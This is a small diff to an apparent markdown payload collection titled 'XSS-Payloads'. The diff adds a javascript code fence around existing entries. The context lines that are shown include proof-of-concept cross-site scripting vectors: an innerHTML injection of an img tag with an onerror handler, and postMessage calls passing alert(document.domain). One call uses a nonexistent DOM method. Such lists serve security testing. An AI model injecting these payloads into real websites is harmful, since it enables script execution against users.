@@ -1,5 +1,7 @@
 # XSS-Payloads
 
+```javascript
+
 Inner XSS
 
 document.getElementsByTag('body')[0].innerHTML = `<img\nsrc="x"onerror=alert(1)>`
@@ -199,3 +201,6 @@ Console
 window.postMessage('alert(document.domain','*')
 
 window.postMessage({"action": "exec", "payload": "alert(document.domain)"}, '*')
+
+```
+
